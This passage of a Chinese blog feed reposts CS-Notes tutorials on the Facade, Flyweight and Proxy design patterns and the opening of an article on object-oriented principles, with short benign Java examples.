title="Intent"></a>Intent</h3><p>提供了一个统一的接口，用来访问子系统中的一群接口，从而让子系统更容易使用。</p><h3 id="Class-Diagram-22"><a href="#Class-Diagram-22" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/f9978fa6-9f49-4a0f-8540-02d269ac448f.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/f9978fa6-9f49-4a0f-8540-02d269ac448f.png" alt="img"></a></p><h3 id="Implementation-22"><a href="#Implementation-22" class="headerlink" title="Implementation"></a>Implementation</h3><p>观看电影需要操作很多电器，使用外观模式实现一键看电影功能。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SubSystem</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">turnOnTV</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"turnOnTV()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCD</span><span class="token punctuation">(</span>String cd<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"setCD( "</span> <span class="token operator">+</span> cd <span class="token operator">+</span> <span class="token string">" )"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">starWatching</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"starWatching()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Facade</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> SubSystem subSystem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SubSystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">watchMovie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        subSystem<span class="token punctuation">.</span><span class="token function">turnOnTV</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        subSystem<span class="token punctuation">.</span><span class="token function">setCD</span><span class="token punctuation">(</span><span class="token string">"a movie"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        subSystem<span class="token punctuation">.</span><span class="token function">starWatching</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Facade facade <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Facade</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        facade<span class="token punctuation">.</span><span class="token function">watchMovie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="设计原则-1"><a href="#设计原则-1" class="headerlink" title="设计原则"></a>设计原则</h3><p>最少知识原则：只和你的密友谈话。也就是说客户对象所需要交互的对象应当尽可能少。</p><h2 id="6-享元（Flyweight）"><a href="#6-享元（Flyweight）" class="headerlink" title="6. 享元（Flyweight）"></a>6. 享元（Flyweight）</h2><h3 id="Intent-23"><a href="#Intent-23" class="headerlink" title="Intent"></a>Intent</h3><p>利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。</p><h3 id="Class-Diagram-23"><a href="#Class-Diagram-23" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Flyweight：享元对象</li><li>IntrinsicState：内部状态，享元对象共享内部状态</li><li>ExtrinsicState：外部状态，每个享元对象的外部状态不同</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/d52270b4-9097-4667-9f18-f405fc661c99.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/d52270b4-9097-4667-9f18-f405fc661c99.png" alt="img"></a></p><h3 id="Implementation-23"><a href="#Implementation-23" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Flyweight</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">doOperation</span><span class="token punctuation">(</span>String extrinsicState<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFlyweight</span> <span class="token keyword">implements</span> <span class="token class-name">Flyweight</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String intrinsicState<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcreteFlyweight</span><span class="token punctuation">(</span>String intrinsicState<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>intrinsicState <span class="token operator">=</span> intrinsicState<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doOperation</span><span class="token punctuation">(</span>String extrinsicState<span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Object address: "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">identityHashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"IntrinsicState: "</span> <span class="token operator">+</span> intrinsicState<span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ExtrinsicState: "</span> <span class="token operator">+</span> extrinsicState<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FlyweightFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> HashMap<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Flyweight<span class="token operator">></span> flyweights <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Flyweight <span class="token function">getFlyweight</span><span class="token punctuation">(</span>String intrinsicState<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>flyweights<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>intrinsicState<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            Flyweight flyweight <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteFlyweight</span><span class="token punctuation">(</span>intrinsicState<span class="token punctuation">)</span><span class="token punctuation">;</span>            flyweights<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>intrinsicState<span class="token punctuation">,</span> flyweight<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> flyweights<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>intrinsicState<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        FlyweightFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FlyweightFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Flyweight flyweight1 <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getFlyweight</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Flyweight flyweight2 <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getFlyweight</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        flyweight1<span class="token punctuation">.</span><span class="token function">doOperation</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        flyweight2<span class="token punctuation">.</span><span class="token function">doOperation</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Object address<span class="token operator">:</span> <span class="token number">1163157884</span>IntrinsicState<span class="token operator">:</span> aaExtrinsicState<span class="token operator">:</span> xObject address<span class="token operator">:</span> <span class="token number">1163157884</span>IntrinsicState<span class="token operator">:</span> aaExtrinsicState<span class="token operator">:</span> y</code></pre><h3 id="JDK-19"><a href="#JDK-19" class="headerlink" title="JDK"></a>JDK</h3><p>Java 利用缓存来加速大量小对象的访问时间。</p><ul><li>java.lang.Integer#valueOf(int)</li><li>java.lang.Boolean#valueOf(boolean)</li><li>java.lang.Byte#valueOf(byte)</li><li>java.lang.Character#valueOf(char)</li></ul><h2 id="7-代理（Proxy）"><a href="#7-代理（Proxy）" class="headerlink" title="7. 代理（Proxy）"></a>7. 代理（Proxy）</h2><h3 id="Intent-24"><a href="#Intent-24" class="headerlink" title="Intent"></a>Intent</h3><p>控制对其它对象的访问。</p><h3 id="Class-Diagram-24"><a href="#Class-Diagram-24" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>代理有以下四类：</p><ul><li>远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。</li><li>虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。</li><li>保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。</li><li>智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数；当第一次引用一个对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/a6c20f60-5eba-427d-9413-352ada4b40fe.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/a6c20f60-5eba-427d-9413-352ada4b40fe.png" alt="img"></a></p><h3 id="Implementation-24"><a href="#Implementation-24" class="headerlink" title="Implementation"></a>Implementation</h3><p>以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Image</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">showImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighResolutionImage</span> <span class="token keyword">implements</span> <span class="token class-name">Image</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> URL imageURL<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">long</span> startTime<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> width<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> height<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> width<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token function">HighResolutionImage</span><span class="token punctuation">(</span>URL imageURL<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>imageURL <span class="token operator">=</span> imageURL<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>startTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token number">600</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> <span class="token number">600</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 模拟图片加载，延迟 3s 加载完成</span>        <span class="token keyword">long</span> endTime <span class="token operator">=</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> endTime <span class="token operator">-</span> startTime <span class="token operator">></span> <span class="token number">3000</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">showImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Real Image: "</span> <span class="token operator">+</span> imageURL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImageProxy</span> <span class="token keyword">implements</span> <span class="token class-name">Image</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> HighResolutionImage highResolutionImage<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ImageProxy</span><span class="token punctuation">(</span>HighResolutionImage highResolutionImage<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>highResolutionImage <span class="token operator">=</span> highResolutionImage<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">showImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>highResolutionImage<span class="token punctuation">.</span><span class="token function">isLoad</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Temp Image: "</span> <span class="token operator">+</span> highResolutionImage<span class="token punctuation">.</span><span class="token function">getWidth</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> highResolutionImage<span class="token punctuation">.</span><span class="token function">getHeight</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        highResolutionImage<span class="token punctuation">.</span><span class="token function">showImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImageViewer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String image <span class="token operator">=</span> <span class="token string">"http://image.jpg"</span><span class="token punctuation">;</span>        URL url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>image<span class="token punctuation">)</span><span class="token punctuation">;</span>        HighResolutionImage highResolutionImage <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HighResolutionImage</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        ImageProxy imageProxy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ImageProxy</span><span class="token punctuation">(</span>highResolutionImage<span class="token punctuation">)</span><span class="token punctuation">;</span>        imageProxy<span class="token punctuation">.</span><span class="token function">showImage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-20"><a href="#JDK-20" class="headerlink" title="JDK"></a>JDK</h3><ul><li>java.lang.reflect.Proxy</li><li>RMI</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li>弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007.</li><li>Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007.</li><li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li><li><a href="http://www.oodesign.com/" target="_blank" rel="noopener">Design Patterns</a></li><li><a href="http://java-design-patterns.com/" target="_blank" rel="noopener">Design patterns implemented in Java</a></li><li><a href="http://www.programering.com/a/MTNxAzMwATY.html" target="_blank" rel="noopener">The breakdown of design patterns in JDK</a></li></ul><p>本文转载自:<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md">https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.md</a></p>]]></content>
      
      
      <categories>
          
          <category> 面向对象 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面向对象思想</title>
      <link href="/2018/12/24/mian-xiang-dui-xiang/mian-xiang-dui-xiang-si-xiang/"/>
      <url>/2018/12/24/mian-xiang-dui-xiang/mian-xiang-dui-xiang-si-xiang/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象思想"><a href="#面向对象思想" class="headerlink" title="面向对象思想"></a>面向对象思想</h2><ul><li>一、三大特性<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%B0%81%E8%A3%85">封装</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E7%BB%A7%E6%89%BF">继承</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%A4%9A%E6%80%81">多态</a></li></ul></li><li>二、类图<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E6%B3%9B%E5%8C%96%E5%85%B3%E7%B3%BB-generalization">泛化关系 (Generalization)</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%AE%9E%E7%8E%B0%E5%85%B3%E7%B3%BB-realization">实现关系 (Realization)</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E8%81%9A%E5%90%88%E5%85%B3%E7%B3%BB-aggregation">聚合关系 (Aggregation)</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E7%BB%84%E5%90%88%E5%85%B3%E7%B3%BB-composition">组合关系 (Composition)</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%85%B3%E8%81%94%E5%85%B3%E7%B3%BB-association">关联关系 (Association)</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E4%BE%9D%E8%B5%96%E5%85%B3%E7%B3%BB-dependency">依赖关系 (Dependency)</a></li></ul></li><li>三、设计原则<ul><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#solid">S.O.L.I.D</a></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%85%B6%E4%BB%96%E5%B8%B8%E8%A7%81%E5%8E%9F%E5%88%99">其他常见原则</a></li></ul></li><li><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99">参考资料</a></li></ul><h1 id="一、三大特性"><a href="#一、三大特性" class="headerlink" title="一、三大特性"></a>一、三大特性</h1><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外接口使之与外部发生联系。用户无需知道对象内部的细节，但可以通过对象对外提供的接口来访问该对象。</p><p>优点：</p><ul><li>减少耦合：可以独立地开发、测试、优化、使用、理解和修改</li><li>减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块</li><li>有效地调节性能：可以通过剖析确定哪些模块影响了系统的性能</li><li>提高软件的可重用性</li><li>降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的</li></ul><p>以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。</p><p>注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> gender<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getGender</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> gender <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">"man"</span> <span class="token operator">:</span> <span class="token string">"woman"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">work</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">&lt;=</span> age <span class="token operator">&amp;&amp;</span> age <span class="token operator">&lt;=</span> <span class="token number">50</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" is working very hard!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">" can't work any more!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承实现了 <strong>IS-A</strong> 关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。</p><p>继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。</p><p>Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为 <strong>向上转型</strong> 。</p><pre class=" language-java"><code class="language-java">Animal animal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>多态分为编译时多态和运行时多态：</p><ul><li>编译时多态主要指方法的重载</li><li>运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定</li></ul><p>运行时多态有三个条件：</p><ul><li>继承</li><li>覆盖（重写）</li><li>向上转型</li></ul><p>下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Instrument</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Instument is playing..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Wind</span> <span class="token keyword">extends</span> <span class="token class-name">Instrument</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Wind is playing..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Percussion</span> <span class="token keyword">extends</span> <span class="token class-name">Instrument</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Percussion is playing..."</span><span class="token 